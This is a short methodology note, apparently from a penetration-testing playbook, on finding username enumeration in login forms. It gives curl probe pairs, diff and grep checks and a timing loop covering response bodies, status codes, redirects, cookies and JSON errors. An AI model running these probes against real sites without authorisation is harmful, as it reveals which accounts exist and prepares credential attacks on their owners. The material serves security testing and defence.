# Login enumeration — the headline form, channel by channel

## The probe pair

```bash
curl -i -X POST -d 'user=KNOWN&pass=x'       "$BASE/login" > good
curl -i -X POST -d 'user=zzz-NOSUCH&pass=x'  "$BASE/login" > bad1
curl -i -X POST -d 'user=zzz-NOSUCH&pass=x'  "$BASE/login" > bad2   # repeat
```

`bad1`==`bad2` (a per-request-noise baseline), and `good`!=`bad` on at
least one channel = the oracle.

## Channel: body

```bash
diff good bad1
grep -oE '(error|invalid|incorrect|wrong|no such|not found|exist)[^<"]*' good
grep -oE '(error|invalid|incorrect|wrong|no such|not found|exist)[^<"]*' bad1
```

The text shapes: `"invalid username"` vs `"invalid password"`, a
different error-code, a different CSS class on the error block. Mask
CSRF/timestamp noise first (`channel-body.md`).

## Channel: status + redirect

```bash
grep -iE '^HTTP|^location' good bad1
```

`200` vs `302`, `302 /login?e=1` vs `?e=2`, `401` vs `404`. Read
`Location`, never follow it.

## Channel: timing

```bash
for i in $(seq 10); do
  curl -s -o /dev/null -w "g %{time_total}\n" -X POST -d 'user=KNOWN&pass=x' "$BASE/login"
  curl -s -o /dev/null -w "b %{time_total}\n" -X POST -d 'user=zzz-NOSUCH&pass=x' "$BASE/login"
done | sort -k2n
```

The bcrypt short-circuit — `timing-oracle.md`.

## Channel: side artifacts

```bash
diff <(grep -i 'set-cookie' good) <(grep -i 'set-cookie' bad1)
```

A session/error cookie on one arm; a `X-Auth-Reason` header; a JSON
`{"reason":"no_user"}`.

## The JSON login

```bash
curl -s -X POST -H 'Content-Type: application/json' \
  -d '{"username":"KNOWN","password":"x"}' "$BASE/api/login"
# {"error":"user_not_found"} vs {"error":"bad_password"}  or  404 vs 401
```

## The lockout confounder

Repeated probes on the SAME real account may lock it — then the response
becomes `"account locked"`, which is itself an oracle (the lock only
fires on a real row) but also kills the account. On a shared/owned
target use your OWN known-good account and a small probe count; never
lock a victim account you do not control to prove the lock exists.

## Recording

`login: <channel>: <delta verbatim>` — e.g. `login: body: "invalid
username"(bad) vs "invalid password"(good)`. A uniform all-channel
result is a real negative for the login form.
